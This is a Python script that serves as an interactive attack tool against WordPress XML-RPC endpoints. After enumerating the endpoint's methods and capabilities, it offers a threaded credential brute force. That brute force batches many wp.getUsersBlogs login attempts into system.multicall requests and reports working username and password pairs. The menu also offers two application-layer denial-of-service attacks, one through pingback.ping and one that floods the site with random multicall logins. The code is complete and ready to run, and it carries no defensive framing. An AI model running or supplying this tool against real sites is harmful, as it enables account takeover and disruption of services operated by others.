import re
import sys
import urllib3
import xml.etree.ElementTree as ET
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import product
import threading
import random
import string

def randstr(length=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
found = threading.Event()


headers = {
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'text/xml'
}

def xmlrpcAlive(url):

    payload = '<?xml version="1.0"?><methodCall><methodName>nonsense.nonsense</methodName></methodCall>'
    
    try: 
        response = requests.post(url, headers=headers, data=payload, verify=False) 
    except requests.RequestException as e:
        print(f"[-] Request failed: {e}")
        sys.exit(0)
    
    if "faultCode" in response.text:
        print("[+] xmlrpc endpoint is alive.")
    else:
        print("[-] xmlrpc might not be alive.")


def listMethods(url):
   
    
    payload = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
    response = requests.post(url,headers=headers, data=payload, verify=False)

    
    methods = re.findall(
        r"<value>\s*<string>(.*?)</string>\s*</value>",
        response.text,
        re.S
    )
    
    if len(methods) == 0:
        print("[-] Unable to access system.listMethods !")
    
    for m in methods:
        print("[+] Method:", m)


    return True

def capabilitiesEnum(url):
    
    payload = '<?xml version="1.0"?><methodCall><methodName>system.getCapabilities</methodName></methodCall>'
    response = requests.post(url, headers=headers, data=payload, verify=False)

    root = ET.fromstring(response.text)


    top_struct = root.find(".//params/param/value/struct")
    if top_struct is None:
        print("[-] No capabilities struct found (possibly fault or blocked).")
        return

    capabilities = {}


    for member in top_struct.findall("member"):
        cap_name = member.findtext("name")
        cap_struct = member.find("value/struct")

        if cap_name is None or cap_struct is None:
            continue

        capabilities[cap_name] = {}


        for sub in cap_struct.findall("member"):
            sub_name = sub.findtext("name")
            sub_value_elem = sub.find("value")

            if sub_name is None or sub_value_elem is None:
                continue


            sub_value = sub_value_elem[0].text
            capabilities[cap_name][sub_name] = sub_value


    for cap, details in capabilities.items():
        print(f"\n[{cap}]")
        for k, v in details.items():
            print(f"  {k}: {v}")



def send_batch(url, headers, batch, batch_id):
    if found.is_set():
        return

    xml_blocks = ""

    for username, password in batch:
        xml_blocks += f"""
        <value>
          <struct>
            <member>
              <name>methodName</name>
              <value><string>wp.getUsersBlogs</string></value>
            </member>
            <member>
              <name>params</name>
              <value>
                <array>
                  <data>
                    <value><string>{username}</string></value>
                    <value><string>{password}</string></value>
                  </data>
                </array>
              </value>
            </member>
          </struct>
        </value>
        """

    payload = f"""<?xml version="1.0"?>
    <methodCall>
      <methodName>system.multicall</methodName>
      <params>
        <param>
          <value>
            <array>
              <data>
                {xml_blocks}
              </data>
            </array>
          </value>
        </param>
      </params>
    </methodCall>
    """

    try:
        r = requests.post(
            url,
            headers=headers,
            data=payload,
            verify=False,
            timeout=10
        )
    except Exception as e:
        print(f"[!] Batch {batch_id} error: {e}")
        return

    print(f"[+] Batch {batch_id} sent | HTTP {r.status_code}")

    try:
        root = ET.fromstring(r.text)
        responses = root.findall(".//array/data/value")
    except Exception:
        print(f"[!] Batch {batch_id} XML parse error")
        return

    for idx, value in enumerate(responses):
        fault = value.find(".//member[name='faultCode']")
        if fault is None:
            user, pwd = batch[idx]
            print(f"\n[++SUCCESS] {user}:{pwd}\n")
            found.set()
            return

def credsBruteforce(url):
    n = int(input("Number of attempts per request: "))
    u = input("Username file path: ")
    p = input("Password file path: ")
    t = int(input("Number of threads: "))

    headers = {
        "Content-Type": "text/xml"
    }

    try:
        with open(u, "r", encoding="utf-8") as f:
            usernames = [x.strip() for x in f if x.strip()]
        with open(p, "r", encoding="utf-8") as f:
            passwords = [x.strip() for x in f if x.strip()]
    except Exception as e:
        print(f"[!] File error: {e}")
        return

    combos = list(product(usernames, passwords))
    batches = [combos[i:i+n] for i in range(0, len(combos), n)]

    print(f"[+] Total combos: {len(combos)}")
    print(f"[+] Total batches: {len(batches)}")
    print(f"[+] Threads: {t}\n")

    with ThreadPoolExecutor(max_workers=t) as executor:
        futures = []

        for i, batch in enumerate(batches, 1):
            futures.append(
                executor.submit(send_batch, url, headers, batch, i)
            )

        for f in as_completed(futures):
            if found.is_set():
                break



def pingbackdos(url):
    
    source = input("\nEnter the url of your hosted file (Bigger the size, more clear the impact):")
    
    target = input("Enter the url to any post on the target:")
    t = int(input("Number of threads:"))
    r = int(input("Times the request needs to be sent:"))

    payload = f'''<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param>
      <value><string>{source}</string></value>
    </param>
    <param>
      <value><string>{target}</string></value>
    </param>
  </params>
</methodCall>
'''

    def send_request(i):
        response = requests.post(
        url,
        headers=headers,
        data=payload,
        verify=False,
        timeout=10
    )
        return i, response.status_code, response.elapsed.total_seconds()

    with ThreadPoolExecutor(max_workers=t) as executor:
        futures = [executor.submit(send_request, i) for i in range(t)]

        for future in as_completed(futures):
            i, status, elapsed = future.result()
            print(f"[*] Req {i} | HTTP:{status} | Response Time:{elapsed:.3f}s")


def thread_worker(url, attempts_per_request, batches_per_thread, thread_id):
    for batch_id in range(1, batches_per_thread + 1):
        send_batch_2(
            url,
            attempts_per_request,
            thread_id,
            batch_id
        )

def send_batch_2(url, attempts, thread_id, batch_id):
    xml_blocks = ""

    for _ in range(attempts):
        u = randstr()
        p = randstr()

        xml_blocks += f"""
        <value>
          <struct>
            <member>
              <name>methodName</name>
              <value><string>wp.getUsersBlogs</string></value>
            </member>
            <member>
              <name>params</name>
              <value>
                <array>
                  <data>
                    <value><string>{u}</string></value>
                    <value><string>{p}</string></value>
                  </data>
                </array>
              </value>
            </member>
          </struct>
        </value>
        """

    payload = f"""<?xml version="1.0"?>
    <methodCall>
      <methodName>system.multicall</methodName>
      <params>
        <param>
          <value>
            <array>
              <data>
                {xml_blocks}
              </data>
            </array>
          </value>
        </param>
      </params>
    </methodCall>
    """

    headers = {"Content-Type": "text/xml"}

    r = requests.post(
        url,
        headers=headers,
        data=payload,
        verify=False
    )

    print(f"[+] Thread {thread_id} | Batch {batch_id} | HTTP {r.status_code}")

def multicall_dos(url):
    attempts = int(input("Login attempts per request: "))
    batches = int(input("Batches per thread: "))
    threads = int(input("Number of threads: "))

    print("\n[+] Starting random login load test")
    print(f"[+] Attempts per request: {attempts}")
    print(f"[+] Batches per thread: {batches}")
    print(f"[+] Threads: {threads}")
    print(f"[+] Total requests: {threads * batches}")
    print(f"[+] Total login attempts: {threads * batches * attempts}\n")

    thread_list = []

    for i in range(1, threads + 1):
        t = threading.Thread(
            target=thread_worker,
            args=(url, attempts, batches, i)
        )
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print("\n[+] Test complete")


def main():

    url = input("Enter the targets URL:") 
    
    while(True):
        print("\nChoose an option:")
        print("[1] Check if XML-RPC endpoint is alive (protocol-level test)")
        print("[2] List all available XML-RPC methods (system.listMethods)")
        print("[3] Enumerate XML-RPC capabilities and supported APIs")
        print("[4] Run XML-RPC credential bruteforce (multicall-based)")
        print("[5] Launch a application layered DOS attack (pingback)")
        print("[6] Launch a application layered DOS attack (multicall-based) ")
        print("[0] Exit")


        option_picked = input("\nChoose:")    


        if option_picked == "1":
            xmlrpcAlive(url)

        elif option_picked == "2":
            listMethods(url)

        elif option_picked == "3":
            capabilitiesEnum(url)

        elif option_picked == "4":
            credsBruteforce(url)

        elif option_picked == "5":
            pingbackdos(url)

        elif option_picked == "6":
            multicall_dos(url)

        elif option_picked == "0":
            sys.exit(0)
        else:
            print("\nInvalid Option!")

if __name__ == "__main__":
    main()
